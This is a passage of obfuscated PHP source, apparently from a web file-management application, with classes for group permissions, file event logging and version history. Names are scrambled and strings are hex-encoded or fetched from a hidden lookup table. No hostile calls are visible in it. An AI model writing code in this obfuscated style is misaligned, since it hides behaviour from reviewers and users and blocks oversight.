$this->userGroupParents($’æúßßÜ)); } private function groupStepToUserGroup($èòÈÖØ¹, $òˆïà÷ = false) { $ŒçöÜ•ˆ =& $_SERVER[§Êá¸İ]; $„‚Ïí·˜ = $this->userGroupList($òˆïà÷); $©İàÃ‚Ñ = 1000; $Ì­»Ş¿è = $GLOBALS[$ŒçöÜ•ˆ[6]][$ŒçöÜ•ˆ[92]][$ŒçöÜ•ˆ[2085]] == 1; $Ü¤ê¨ = $Ì­»Ş¿è ? 3 : 2; foreach ($„‚Ïí·˜ as $à”îÇ°š) { if ($à”îÇ°š[$ŒçöÜ•ˆ[1978]] == $èòÈÖØ¹) { return 0; } $ìÒ©ì² = explode($ŒçöÜ•ˆ[50], trim($à”îÇ°š[$ŒçöÜ•ˆ[592]], $ŒçöÜ•ˆ[50])); if ($ìÒ©ì²[0] == $ŒçöÜ•ˆ[228] && count($ìÒ©ì²) > $Ü¤ê¨) { $Çã»×®¬ = array_reverse(array_slice($ìÒ©ì², $Ü¤ê¨)); $†öÄµ– = array_search($èòÈÖØ¹, $Çã»×®¬); if ($†öÄµ– !== !1 && $†öÄµ– + 1 <= $©İàÃ‚Ñ) { $©İàÃ‚Ñ = $†öÄµ– + 1; } } } return $©İàÃ‚Ñ; } private function userGroupList($¼“òíòú = false) { $ªÎÖŞ¶¡ =& $_SERVER[§Êá¸İ]; static $ùí´œ¼Ú = array(); if (isset($ùí´œ¼Ú[$¼“òíòú])) { return $ùí´œ¼Ú[$¼“òíòú]; } $ •çØüÄ = Model($ªÎÖŞ¶¡[606])->getInfo($¼“òíòú); $ùí´œ¼Ú[$¼“òíòú] = array_to_keyvalue($ •çØüÄ[$ªÎÖŞ¶¡[2169]], $ªÎÖŞ¶¡[1978]); return $ùí´œ¼Ú[$¼“òíòú]; } public function userGroupParents($ÙÉˆŒ³ï) { $ÁŒ– ‰Ó =& $_SERVER[§Êá¸İ]; static $ÄÃÁƒõ = array(); $ÙÉˆŒ³ï = $ÙÉˆŒ³ï ? $ÙÉˆŒ³ï : USER_ID; if (isset($ÄÃÁƒõ[$ÙÉˆŒ³ï])) { return $ÄÃÁƒõ[$ÙÉˆŒ³ï]; } $Úƒê’ = $this->userGroupList($ÙÉˆŒ³ï); $İÛÕ¿Ò = array(); $¡ŒËÅí = $GLOBALS[$ÁŒ– ‰Ó[6]][$ÁŒ– ‰Ó[92]][$ÁŒ– ‰Ó[2085]] == 1; $Ã§®â³ = $¡ŒËÅí ? 3 : 2; foreach ($Úƒê’ as $è­›•ã”) { $£‡†×œÄ = array($è­›•ã”[$ÁŒ– ‰Ó[1978]]); $ÇÛÚïš¢ = explode($ÁŒ– ‰Ó[50], trim($è­›•ã”[$ÁŒ– ‰Ó[592]], $ÁŒ– ‰Ó[50])); if ($ÇÛÚïš¢[0] == $ÁŒ– ‰Ó[228] && count($ÇÛÚïš¢) > $Ã§®â³) { $ßßşşê« = array_slice($ÇÛÚïš¢, $Ã§®â³); $£‡†×œÄ = array_merge($£‡†×œÄ, array_reverse($ßßşşê«)); } $İÛÕ¿Ò = array_merge($İÛÕ¿Ò, $£‡†×œÄ); } $ÄÃÁƒõ[$ÙÉˆŒ³ï] = array_unique($İÛÕ¿Ò); return $ÄÃÁƒõ[$ÙÉˆŒ³ï]; } public function authTargetInfoMake($¶¹Õ¡´) { $®¨íÁíø =& $_SERVER[§Êá¸İ]; $„¿¡üÉÚ = array(); $°øâì¿µ = array(); foreach ($¶¹Õ¡´ as $ÚÏ¦×ä¶) { if ($ÚÏ¦×ä¶[$®¨íÁíø[190]] == SourceModel::TYPE_USER) { $„¿¡üÉÚ[] = intval($ÚÏ¦×ä¶[$®¨íÁíø[577]]); } else { if ($ÚÏ¦×ä¶[$®¨íÁíø[190]] == SourceModel::TYPE_GROUP) { $°øâì¿µ[] = intval($ÚÏ¦×ä¶[$®¨íÁíø[577]]); } } } if ($„¿¡üÉÚ) { $„¿¡üÉÚ = Model($®¨íÁíø[585])->userListInfo($„¿¡üÉÚ); } if ($°øâì¿µ) { $˜úçª¾ = array($®¨íÁíø[2070] => array($®¨íÁíø[500], $°øâì¿µ)); $°øâì¿µ = Model($®¨íÁíø[593])->field($®¨íÁíø[2199])->where($˜úçª¾)->select(); $°øâì¿µ = array_to_keyvalue($°øâì¿µ, $®¨íÁíø[1978]); } return array($®¨íÁíø[2200] => $„¿¡üÉÚ, $®¨íÁíø[2201] => $°øâì¿µ); } public function authInfo($“—Ò¿âœ) { $‚ƒùÀäƒ =& $_SERVER[§Êá¸İ]; if ($“—Ò¿âœ[$‚ƒùÀäƒ[2086]]) { $ÉÓíÑÇ· = Model($‚ƒùÀäƒ[579])->listData($“—Ò¿âœ[$‚ƒùÀäƒ[2086]]); if (!$ÉÓíÑÇ·) { return !1; $¿††Úá = Model($‚ƒùÀäƒ[579])->listData(); $îˆ£ì×ˆ = array_filter_by_field($¿††Úá, $‚ƒùÀäƒ[495], $‚ƒùÀäƒ[228]); return $îˆ£ì×ˆ; } $¥Ì†¬¦ = array_field_key($ÉÓíÑÇ·, array($‚ƒùÀäƒ[483], $‚ƒùÀäƒ[32], $‚ƒùÀäƒ[495], $‚ƒùÀäƒ[2001], $‚ƒùÀäƒ[2002])); $¥Ì†¬¦[$‚ƒùÀäƒ[2202]] = $“—Ò¿âœ; return $¥Ì†¬¦; } else { return array($‚ƒùÀäƒ[501] => 0, $‚ƒùÀäƒ[1984] => $“—Ò¿âœ[$‚ƒùÀäƒ[2146]], $‚ƒùÀäƒ[502] => $‚ƒùÀäƒ[12], $‚ƒùÀäƒ[2001] => $‚ƒùÀäƒ[2203]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\x69\157\x5f\x73\157\165\162\x63\145\x5f\x65\x76\145\156\x74"; protected $dataAuto = array(array("\x63\162\x65\x61\x74\x65\x54\151\x6d\x65", "\x74\151\155\x65", "\x69\156\x73\145\x72\164", "\146\x75\x6e\x63\164\151\x6f\x6e"), array("\x64\x65\163\x63", '', "\151\156\x73\145\162\x74\54\165\x70\x64\141\164\145\54\x73\x65\x6c\145\x63\164", "\152\163\157\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($§„ÙÏµÕ, $Ÿ“’¹ØÖ, $»ôè·íò = '') { $’¢î¾áú =& $_SERVER[§Êá¸İ]; if (!$this->eventSave) { return; } $ÂÁæ¹Ñİ = Model($’¢î¾áú[1428])->sourceInfo($§„ÙÏµÕ); if (!$ÂÁæ¹Ñİ) { return !1; } if ($this->isDisableEvent($ÂÁæ¹Ñİ, $Ÿ“’¹ØÖ)) { return; } if ($»ôè·íò && is_string($»ôè·íò)) { $»ôè·íò = array($’¢î¾áú[2017] => $»ôè·íò); } $Öàë¤Ğ = defined($’¢î¾áú[2204]) ? USER_ID : 0; $È¹íÚš = array($’¢î¾áú[499] => $§„ÙÏµÕ, $’¢î¾áú[2205] => $ÂÁæ¹Ñİ[$’¢î¾áú[192]], $’¢î¾áú[2206] => $ÂÁæ¹Ñİ[$’¢î¾áú[32]], $’¢î¾áú[590] => !empty($ÂÁæ¹Ñİ[$’¢î¾áú[590]]) ? $ÂÁæ¹Ñİ[$’¢î¾áú[590]] : $’¢î¾áú[12], $’¢î¾áú[1770] => $Öàë¤Ğ, $’¢î¾áú[504] => $Ÿ“’¹ØÖ, $’¢î¾áú[1772] => $»ôè·íò); $this->addSystemLog($Ÿ“’¹ØÖ, $È¹íÚš); unset($È¹íÚš[$’¢î¾áú[2206]], $È¹íÚš[$’¢î¾áú[590]]); return $this->add($È¹íÚš); } private function addSystemLog($¼ˆøï¡¥, $Ù±†ò³‘) { $Í÷Š­µ¨ =& $_SERVER[§Êá¸İ]; if ($¼ˆøï¡¥ == $Í÷Š­µ¨[2207]) { $¼ˆøï¡¥ = $Ù±†ò³‘[$Í÷Š­µ¨[534]][$Í÷Š­µ¨[2208]]; } else { if (in_array($¼ˆøï¡¥, array($Í÷Š­µ¨[1957], $Í÷Š­µ¨[2209]))) { $¼ˆøï¡¥ = $Ù±†ò³‘[$Í÷Š­µ¨[534]][$Í÷Š­µ¨[171]]; } } $Ê“ú·¨€ = array_merge($Ù±†ò³‘, array($Í÷Š­µ¨[2210] => $Ù±†ò³‘[$Í÷Š­µ¨[193]], $Í÷Š­µ¨[2211] => $Ù±†ò³‘[$Í÷Š­µ¨[2211]])); Hook::trigger($Í÷Š­µ¨[2212], $Í÷Š­µ¨[2213] . $¼ˆøï¡¥, $Ù±†ò³‘); Model($Í÷Š­µ¨[1921])->addLog($Í÷Š­µ¨[2213] . $¼ˆøï¡¥, $Ê“ú·¨€); } private function isDisableEvent($¼©Í¦‡Ì, $–Ê ÇÇ€) { $¡¨ò³ñ =& $_SERVER[§Êá¸İ]; if ($¼©Í¦‡Ì[$¡¨ò³ñ[190]] != SourceModel::TYPE_SYSTEM) { return !1; } if ($–Ê ÇÇ€ == $¡¨ò³ñ[1946]) { return !1; } return !0; } public function eventCreate($á›‰Ó‡Ş, $€ßéß) { $ˆ³Úóë =& $_SERVER[§Êá¸İ]; $“¶ïÍ² = Model($ˆ³Úóë[1428])->sourceInfo($á›‰Ó‡Ş); $¥¤šòÙ = array($ˆ³Úóë[2208] => $€ßéß, $ˆ³Úóë[32] => $“¶ïÍ²[$ˆ³Úóë[32]]); return $this->addEvent($á›‰Ó‡Ş, $ˆ³Úóë[2207], $¥¤šòÙ); } public function eventFileEdit($¿“Â˜ËÒ) { $ÜÚì¯“ =& $_SERVER[§Êá¸İ]; $±µÉ‡‡è = array($ÜÚì¯“[2214] => $_SERVER[$ÜÚì¯“[2215]], $ÜÚì¯“[2216] => strtolower(ACTION)); if (isset($GLOBALS[$ÜÚì¯“[7]][$ÜÚì¯“[2217]])) { $±µÉ‡‡è[$ÜÚì¯“[2217]] = $ÜÚì¯“[91]; } return $this->addEvent($¿“Â˜ËÒ, $ÜÚì¯“[1947], $±µÉ‡‡è); } public function eventRecycle($ÁŸÌÃù•, $Æ³çÔğ) { return $this->addEvent($ÁŸÌÃù•, $_SERVER[§Êá¸İ][2209], $Æ³çÔğ); } private static $_removeLast = ''; public function eventRemove($ã±òÔÓ) { $Õ³ßÙòÛ =& $_SERVER[§Êá¸İ]; self::$_removeLast = $ã±òÔÓ; $—æ”¬¡ = Model($Õ³ßÙòÛ[1428])->sourceInfo($ã±òÔÓ); $éÑµãĞê = array_field_key($—æ”¬¡, array($Õ³ßÙòÛ[193], $Õ³ßÙòÛ[549], $Õ³ßÙòÛ[513], $Õ³ßÙòÛ[592])); $Àß„¸¾ƒ = array($Õ³ßÙòÛ[171] => $—æ”¬¡[$Õ³ßÙòÛ[32]], $Õ³ßÙòÛ[2216] => ACTION, $Õ³ßÙòÛ[2218] => $éÑµãĞê); return $this->addEvent($—æ”¬¡[$Õ³ßÙòÛ[192]], $Õ³ßÙòÛ[1946], $Àß„¸¾ƒ); } public function eventShare($©ø¥ˆ¿¾, $ÎÈê­•ì) { return $this->addEvent($©ø¥ˆ¿¾, $_SERVER[§Êá¸İ][1957], $ÎÈê­•ì); } public function eventMove($Õ‚Œ‰÷˜, $¥£ÓÅÄ˜, $øˆÖùæ) { $Äàö»õ =& $_SERVER[§Êá¸İ]; if (self::$_removeLast == $Õ‚Œ‰÷˜) { return; } $ß±İâİ¯ = Model($Äàö»õ[1428]); $¸¯¸‹¬ = $ß±İâİ¯->sourceInfo($Õ‚Œ‰÷˜); $Çı¢Ÿà = $ß±İâİ¯->sourceInfo($¥£ÓÅÄ˜); $‹¡øÜîó = $ß±İâİ¯->sourceInfo($øˆÖùæ); $ÜŸ‚ÈçÑ = array($Äàö»õ[1251] => $¥£ÓÅÄ˜, $Äàö»õ[2219] => $Çı¢Ÿà[$Äàö»õ[32]], $Äàö»õ[2195] => !empty($Çı¢Ÿà[$Äàö»õ[590]]) ? $Çı¢Ÿà[$Äàö»õ[590]] : $Äàö»õ[12], $Äàö»õ[1252] => $øˆÖùæ, $Äàö»õ[2220] => $‹¡øÜîó[$Äàö»õ[32]], $Äàö»õ[2221] => !empty($‹¡øÜîó[$Äàö»õ[590]]) ? $‹¡øÜîó[$Äàö»õ[590]] : $Äàö»õ[12]); $this->addEvent($Õ‚Œ‰÷˜, $Äàö»õ[628], $ÜŸ‚ÈçÑ); $¸¯¸‹¬ = $ß±İâİ¯->sourceInfo($Õ‚Œ‰÷˜); $ÜŸ‚ÈçÑ = array($Äàö»õ[193] => $¸¯¸‹¬[$Äàö»õ[193]], $Äàö»õ[32] => $¸¯¸‹¬[$Äàö»õ[32]]); $this->addEvent($¥£ÓÅÄ˜, $Äàö»õ[2222], $ÜŸ‚ÈçÑ); } public function eventCopy($±¨™çÒÅ) { $this->eventCreate($±¨™çÒÅ, $_SERVER[§Êá¸İ][626]); } public function eventRename($˜™ó­‘ê, $ïù™–Ä¹, $»·Á³ÍÅ) { $æÃö˜ï =& $_SERVER[§Êá¸İ]; $ü‚µÆªß = array($æÃö˜ï[1251] => $ïù™–Ä¹, $æÃö˜ï[1252] => $»·Á³ÍÅ); return $this->addEvent($˜™ó­‘ê, $æÃö˜ï[1442], $ü‚µÆªß); } public function eventAddComment($úşõ´šœ, $äÒó²) { return $this->addEvent($úşõ´šœ, $_SERVER[§Êá¸İ][2223], $äÒó²); } public function eventAddDesc($½•Œ³, $‚Ö™ü´³) { return $this->addEvent($½•Œ³, $_SERVER[§Êá¸İ][2224], $‚Ö™ü´³); } public function listBySource($¼ãıì²‚) { $“ã©Ú£ö =& $_SERVER[§Êá¸İ]; $ €¾Á¢Ù = Model($“ã©Ú£ö[1428])->sourceInfo($¼ãıì²‚); $âò€ğ”ã = array($“ã©Ú£ö[499] => $¼ãıì²‚); if ($ €¾Á¢Ù[$“ã©Ú£ö[493]] == $“ã©Ú£ö[91]) { $’ê™¬’ş = Model($“ã©Ú£ö[1428])->listSearchChildren($¼ãıì²‚, 20000); $’ê™¬’ş[] = $¼ãıì²‚ . $“ã©Ú£ö[454]; $âò€ğ”ã = array($“ã©Ú£ö[193] => array($“ã©Ú£ö[7], $’ê™¬’ş)); } $—ÅÙè‚ï = $this->where($âò€ğ”ã)->order($“ã©Ú£ö[2225])->selectPage(); if ($—ÅÙè‚ï[$“ã©Ú£ö[442]][$“ã©Ú£ö[443]] == 0) { $—ÅÙè‚ï[$“ã©Ú£ö[442]][$“ã©Ú£ö[443]] = 1; $—ÅÙè‚ï[$“ã©Ú£ö[445]] = array(array($“ã©Ú£ö[499] => $¼ãıì²‚, $“ã©Ú£ö[2205] => $ €¾Á¢Ù[$“ã©Ú£ö[192]], $“ã©Ú£ö[1770] => $ €¾Á¢Ù[$“ã©Ú£ö[535]], $“ã©Ú£ö[504] => $“ã©Ú£ö[2226], $“ã©Ú£ö[505] => $ €¾Á¢Ù[$“ã©Ú£ö[231]], $“ã©Ú£ö[1772] => $“ã©Ú£ö[12])); } return $this->eventListParse($—ÅÙè‚ï, $¼ãıì²‚); } private function eventListParse($º¨ß¥, $âëü¸éõ) { $Şìœ¼ä® =& $_SERVER[§Êá¸İ]; $í£œ²— = $º¨ß¥[$Şìœ¼ä®[445]]; $Ç“£æ­‹ = array_to_keyvalue($í£œ²—, $Şìœ¼ä®[12], $Şìœ¼ä®[193]); $ˆ™á³Î = array_to_keyvalue($í£œ²—, $Şìœ¼ä®[12], $Şìœ¼ä®[2211]); foreach ($í£œ²— as $“‰£öıİ) { $ÅæÍ†ú = $“‰£öıİ[$Şìœ¼ä®[534]]; if ($“‰£öıİ[$Şìœ¼ä®[33]] == $Şìœ¼ä®[628] && isset($ÅæÍ†ú[$Şìœ¼ä®[1251]])) { $Ç“£æ­‹[] = $ÅæÍ†ú[$Şìœ¼ä®[1251]] . $Şìœ¼ä®[12]; $Ç“£æ­‹[] = $ÅæÍ†ú[$Şìœ¼ä®[1252]] . $Şìœ¼ä®[12]; } if ($“‰£öıİ[$Şìœ¼ä®[33]] == $Şìœ¼ä®[2222] && isset($ÅæÍ†ú[$Şìœ¼ä®[193]])) { $Ç“£æ­‹[] = $ÅæÍ†ú[$Şìœ¼ä®[193]] . $Şìœ¼ä®[12]; } } $Ç“£æ­‹ = array_merge($Ç“£æ­‹, $ˆ™á³Î, array($âëü¸éõ . $Şìœ¼ä®[12])); $Ç“£æ­‹ = array_unique($Ç“£æ­‹); $µ¦ÙöÄ = array_unique(array_to_keyvalue($í£œ²—, $Şìœ¼ä®[12], $Şìœ¼ä®[1779])); $À‘âíû = Model($Şìœ¼ä®[606])->userListInfo($µ¦ÙöÄ); $¢·©‚ŸĞ = Model($Şìœ¼ä®[911])->sourceListInfo($Ç“£æ­‹, !0); foreach ($í£œ²— as &$“‰£öıİ) { if ($“‰£öıİ[$Şìœ¼ä®[33]] == $Şìœ¼ä®[628] && isset($“‰£öıİ[$Şìœ¼ä®[534]][$Şìœ¼ä®[1251]])) { $“‰£öıİ[$Şìœ¼ä®[534]][$Şìœ¼ä®[1251]] = $¢·©‚ŸĞ[$“‰£öıİ[$Şìœ¼ä®[534]][$Şìœ¼ä®[1251]]]; $“‰£öıİ[$Şìœ¼ä®[534]][$Şìœ¼ä®[1252]] = $¢·©‚ŸĞ[$“‰£öıİ[$Şìœ¼ä®[534]][$Şìœ¼ä®[1252]]]; } if ($“‰£öıİ[$Şìœ¼ä®[33]] == $Şìœ¼ä®[2222] && isset($“‰£öıİ[$Şìœ¼ä®[534]][$Şìœ¼ä®[193]])) { $“‰£öıİ[$Şìœ¼ä®[534]][$Şìœ¼ä®[193]] = $¢·©‚ŸĞ[$“‰£öıİ[$Şìœ¼ä®[534]][$Şìœ¼ä®[193]]]; } $“‰£öıİ[$Şìœ¼ä®[90]] = $¢·©‚ŸĞ[$“‰£öıİ[$Şìœ¼ä®[193]]]; $“‰£öıİ[$Şìœ¼ä®[2227]] = $¢·©‚ŸĞ[$“‰£öıİ[$Şìœ¼ä®[2211]]]; if ($“‰£öıİ[$Şìœ¼ä®[33]] == $Şìœ¼ä®[1946]) { $“‰£öıİ[$Şìœ¼ä®[2227]] = $“‰£öıİ[$Şìœ¼ä®[90]]; $“‰£öıİ[$Şìœ¼ä®[2211]] = $“‰£öıİ[$Şìœ¼ä®[2227]][$Şìœ¼ä®[193]]; $“‰£öıİ[$Şìœ¼ä®[90]] = !1; $“‰£öıİ[$Şìœ¼ä®[193]] = $Şìœ¼ä®[12]; } $“‰£öıİ[$Şìœ¼ä®[2154]] = $À‘âíû[$“‰£öıİ[$Şìœ¼ä®[1779]]]; } unset($“‰£öıİ); $º¨ß¥[$Şìœ¼ä®[445]] = $í£œ²—; return $º¨ß¥; } public function removeBySource($ËÈÇæà‰) { $öÏ¸›È½ = array($_SERVER[§Êá¸İ][499] => $ËÈÇæà‰); $this->where($öÏ¸›È½)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\151\x6f\137\x73\157\165\x72\143\x65\x5f\150\x69\x73\164\157\162\171"; public function historyCount($é®‘‚Éü) { $ø¦’Éß« =& $_SERVER[§Êá¸İ]; if (!$é®‘‚Éü) { return array(); } if (is_string($é®‘‚Éü) || is_int($é®‘‚Éü)) { $é®‘‚Éü = array($é®‘‚Éü); } $ù“şË¢œ = array($ø¦’Éß«[193], $ø¦’Éß«[2011] => $ø¦’Éß«[573]); $›¸—²° = array($ø¦’Éß«[193] => array($ø¦’Éß«[7], $é®‘‚Éü)); $ôÑ­¸’÷ = $this->field($ù“şË¢œ)->where($›¸—²°)->group($ø¦’Éß«[193])->select(); return array_to_keyvalue($ôÑ­¸’÷, $ø¦’Éß«[193], $ø¦’Éß«[573]); } public function addHistory($»Å«¿¥, $ïÓÈßê¼ = '') { $êººĞß =& $_SERVER[§Êá¸İ]; $áÎæ×÷Æ = array($êººĞß[499] => $»Å«¿¥[$êººĞß[193]], $êººĞß[1770] => isset($»Å«¿¥[$êººĞß[537]]) ? $»Å«¿¥[$êººĞß[537]] : $»Å«¿¥[$êººĞß[535]], $êººĞß[550] => $»Å«¿¥[$êººĞß[549]], $êººĞß[625] => $»Å«¿¥[$êººĞß[79]], $êººĞß[2228] => $ïÓÈßê¼); if ($GLOBALS[$êººĞß[6]][$êººĞß[92]][$êººĞß[1312]] >= 1) { $this->historyAutoClear($áÎæ×÷Æ[$êººĞß[193]]); $this->add($áÎæ×÷Æ); } Hook::trigger($êººĞß[2229], $áÎæ×÷Æ); Model($êººĞß[2230])->eventFileEdit($»Å«¿¥[$êººĞß[193]]); } private function historyAutoClear($üŠëóÙ) { $ »àÉØ‰ =& $_SERVER[§Êá¸İ]; $¯¯èÈ‘ = Model($ »àÉØ‰[857])->get($ »àÉØ‰[1334]); $ß¤Ù¶²ç = intval($GLOBALS[$ »àÉØ‰[6]][$ »àÉØ‰[92]][$ »àÉØ‰[1312]]); $·£º¤¿ = $¯¯èÈ‘ == $ »àÉØ‰[1335] ? min(5, $ß¤Ù¶²ç) : $ß¤Ù¶²ç; $·£º¤¿ = $·£º¤¿ <= 0 ? 0 : $·£º¤¿ - 1; if ($·£º¤¿ >= 499) { return; } $òÜ—ó· = array($ »àÉØ‰[499] => $üŠëóÙ); $ãÃÎŸã = $this->field($ »àÉØ‰[2231])->where($òÜ—ó·)->order($ »àÉØ‰[2225])->select(); if (!$ãÃÎŸã || $·£º¤¿ >= count($ãÃÎŸã)) { return; } $„Ü‚—‚ø = array_to_keyvalue($ãÃÎŸã, $ »àÉØ‰[12], $ »àÉØ‰[483]); $„Ü‚—‚ø = array_slice($„Ü‚—‚ø, $·£º¤¿); $ÍºÑó¼º = array_to_keyvalue($ãÃÎŸã, $ »àÉØ‰[12], $ »àÉØ‰[549]); $ÍºÑó¼º = array_slice($ÍºÑó¼º, $·£º¤¿); if (!$„Ü‚—‚ø || !$ÍºÑó¼º) { return; } $òÜ—ó· = array($ »àÉØ‰[501] => array($ »àÉØ‰[7], $„Ü‚—‚ø)); $this->where($òÜ—ó·)->delete(); Model($ »àÉØ‰[552])->remove($ÍºÑó¼º); } public function listData($Ò°õÑÏÏ) { $€Ô–íÀ” =& $_SERVER[§Êá¸İ]; $…“·ß×¶ = array($€Ô–íÀ”[499] => $Ò°õÑÏÏ); $Á€»²ÇÂ = $€Ô–íÀ”[2232]; $öö²²­á = $this->field($Á€»²ÇÂ)->where($…“·ß×¶)->order($€Ô–íÀ”[2225])->selectPage(); $this->_listAppendUser($öö²²­á[$€Ô–íÀ”[445]]); $è†Àœµ = Model($€Ô–íÀ”[857])->get($€Ô–íÀ”[1334]); $“¢ï†êÅ = 5; if ($è†Àœµ == $€Ô–íÀ”[1335]) { $öö²²­á[$€Ô–íÀ”[445]] = array_slice($öö²²­á[$€Ô–íÀ”[445]], 0, $“¢ï†êÅ); $öö²²­á[$€Ô–íÀ”[442]] = array($€Ô–íÀ”[2233] => 1, $€Ô–íÀ”[2234] => 20, $€Ô–íÀ”[2235] => 1, $€Ô–íÀ”[2236] => count($öö²²­á[$€Ô–íÀ”[445]])); } return $öö²²­á; } protected function _listAppendUser(&$ò€»Èˆ†) { $¸“òÇëÆ =& $_SERVER[§Êá¸İ]; $íñ‰¦üÎ = array_to_keyvalue($ò€»Èˆ†, $¸“òÇëÆ[12], $¸“òÇëÆ[1779]); $¥Ì–í¢³ = Model($¸“òÇëÆ[606])->userListInfo($íñ‰¦üÎ); foreach ($ò€»Èˆ† as &$®°›ÌŸ­) { $ëèó‡‘· = $®°›ÌŸ­[$¸“òÇëÆ[1779]]; $®°›ÌŸ­[$¸“òÇëÆ[535]] = $¥Ì–í¢³[$ëèó‡‘·] ? $¥Ì–í¢³[$ëèó‡‘·] : !1; } unset($®°›ÌŸ­); } public function fileInfo($ª¤’î ç) { $Ì×‘Êú =& $_SERVER[§Êá¸İ]; $ë‹£¡Ó = $this->tablePrefix; $«œ˜Âò‹ = "{$ë‹£¡Ó}\151\x6f\x5f\146\x69\x6c\x65\x20\x66\151\154\145\x73\40\157\x6e\x20\146\x69\154\145\163\x2e\146\x69\154\x65\x49\104\x20\75\40\150\151\163\164\157\x72\x79\56\x66\151\x6c\145\x49\x44"; return $this->alias($Ì×‘Êú[2237])->where(array($Ì×‘Êú[501] => $ª¤’î ç))->join($«œ˜Âò‹, $Ì×‘Êú[2238])->find(); } public function removeItem($Õ³£€€¹) { $òÏ®¤¼ƒ =& $_SERVER[§Êá¸İ]; $©ñ¡Œº = array($òÏ®¤¼ƒ[501] => $Õ³£€€¹); $¯À·Ì¸Á = $this->where($©ñ¡Œº)->find(); if ($¯À·Ì¸Á) { $â©ó‚”í = $this->where($©ñ¡Œº)->delete(); Model($òÏ®¤¼ƒ[552])->remove($¯À·Ì¸Á[$òÏ®¤¼ƒ[549]]); return $â©ó‚”í; } return !1; } public function removeBySource($­Üœîü) { $èñ²÷Ù =& $_SERVER[§Êá¸İ]; if (!$­Üœîü) { return !1; } if (!is_array($­Üœîü)) { $­Üœîü = array($­Üœîü); } $•î…†Ã = array($èñ²÷Ù[499] => array($èñ²÷Ù[7], $­Üœîü)); $Ÿõî”Å¦ = $this->field($èñ²÷Ù[550])->where($•î…†Ã)->select(); if ($Ÿõî”Å¦) { $this->where($•î…†Ã)->delete(); $åÔ¶½­æ = array_to_keyvalue($Ÿõî”Å¦, $èñ²÷Ù[12], $èñ²÷Ù[549]); Model($èñ²÷Ù[552])->remove($åÔ¶½­æ); } return !0; } public function setDetail($êç€Úˆ„, $àÔÖ‘ù) { $‚×’ü¿é =& $_SERVER[§Êá¸İ]; return $this->where(array($‚×’ü¿é[501] => $êç€Úˆ„))->save(array($‚×’ü¿é[2228] => $àÔÖ‘ù)); } public function rollbackToItem($Öü…½Ù, $Ÿöú°í³) { $çüÜ’çö =& $_SERVER[§Êá¸İ]; $¤şãŸœ¬ = Model($çüÜ’çö[911])->sourceInfo($Öü…½Ù); $this->addHistory($¤şãŸœ¬, LNG($çüÜ’çö[2239])); $”‰·èãú = $this->find($Ÿöú°í³); $áÖßı®É = array($çüÜ’çö[549] => $”‰·èãú[$çüÜ’çö[549]], $çüÜ’çö[79] => $”‰·èãú[$çüÜ’çö[79]], $çüÜ’çö[88] => time(), $çüÜ’çö[537] => USER_ID); Model($çüÜ’çö[911])->where(array($çüÜ’çö[193] => $Öü…½Ù))->save($áÖßı®É); return $this->where(array($çüÜ’çö[501] => $Ÿöú°í³))->delete(); } public function clearSame($°—¾í…„) { $² ”¨ï¢ =& $_SERVER[§Êá¸İ]; $ğĞÊºÔÖ = $this->listData($°—¾í…„); $ÒÂ¬É½û = array_to_keyvalue_group($ğĞÊºÔÖ, $² ”¨ï¢[549]); $›µš¥ê = array(); $ÇÁÓ„ãş = array(); foreach ($ÒÂ¬É½û as $ƒá¥îİÙ) { if (!$ƒá¥îİÙ || count($ƒá¥îİÙ) <= 1) { continue; } foreach ($ƒá¥îİÙ as $ì¡—…»Ó) { $›µš¥ê[] = $ì¡—…»Ó[$² ”¨ï¢[549]]; $ÇÁÓ„ãş[] = $ì¡—…»Ó[$² ”¨ï¢[483]]; } } if (!$ÇÁÓ„ãş) { return; } $this->where(array($² ”¨ï¢[483] => array($² ”¨ï¢[7], $ÇÁÓ„ãş)))->delete(); Model($² ”¨ï¢[552])->remove($›µš¥ê); } public function userSpace() { $ûÊˆşÚÒ =& $_SERVER[§Êá¸İ]; $†„¸üÅù = $this->tablePrefix; $í¦›şõ = array($ûÊˆşÚÒ[1770] => USER_ID); $Ë»Ì…ÓÈ = "{$†„¸üÅù}\x69\x6f\137\x66\x69\x6c\145\x20\x66\x69\154\145\163\40\x6f\156\x20\x66\151\x6c\x65\x73\56\x66\x69\154\x65\x49\x44\x20\x3d\40\150\x69\x73\164\157\162\x79\x2e\x66\x69\154\145\111\104"; return $this->alias($ûÊˆşÚÒ[2237])->where($í¦›şõ)->join($Ë»Ì…ÓÈ, $ûÊˆşÚÒ[2238])->sum($ûÊˆşÚÒ[79]); } } goto d¯¥ŸÔÃœæ; cöÊï«Ï‡‹: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $ƒÎóß„ª =& $_SERVER[§Êá¸İ]; $this->objectDriver = array($ƒÎóß„ª[60], $ƒÎóß„ª[61], $ƒÎóß„ª[62], $ƒÎóß„ª[63], $ƒÎóß„ª[64], $ƒÎóß„ª[65], $ƒÎóß„ª[66], $ƒÎóß„ª[67], $ƒÎóß„ª[68], $ƒÎóß„ª[69], $ƒÎóß„ª[70], $ƒÎóß„ª[71]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($ ÅøíÎ”) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($ ÅøíÎ”, $_SERVER[§Êá¸İ][8]); } return $ ÅøíÎ”; } public function iconvApp($ÂÚÊ¬) { return $ÂÚÊ¬; } public function iconvSystem($âŠ¯öì) { return $âŠ¯öì; } public function iconvTo($É—£¬…€, $è¶‚†áÁ, $¦¹òûÂí) { $â¤™Äà¼ =& $_SERVER[§Êá¸İ]; if (!$É—£¬…€ || !function_exists($â¤™Äà¼[72])) { return $É—£¬…€; } static $îñŒ¬Ñ¤ = array(); $Ó×£Ö• = $è¶‚†áÁ . $â¤™Äà¼[73] . $¦¹òûÂí . $â¤™Äà¼[74] . $É—£¬…€; if (isset($îñŒ¬Ñ¤[$Ó×£Ö•])) { return $îñŒ¬Ñ¤[$Ó×£Ö•]; } if (function_exists($â¤™Äà¼[75])) { $ıÃº«”¸ = @mb_convert_encoding($É—£¬…€, $¦¹òûÂí, $è¶‚†áÁ); } else { $ıÃº«”¸ = @iconv($è¶‚†áÁ, $¦¹òûÂí, $É—£¬…€); } $ıÃº«”¸ = $ıÃº«”¸ ? $ıÃº«”¸ : $É—£¬…€; if (strstr($ıÃº«”¸, $â¤™Äà¼[76])) { 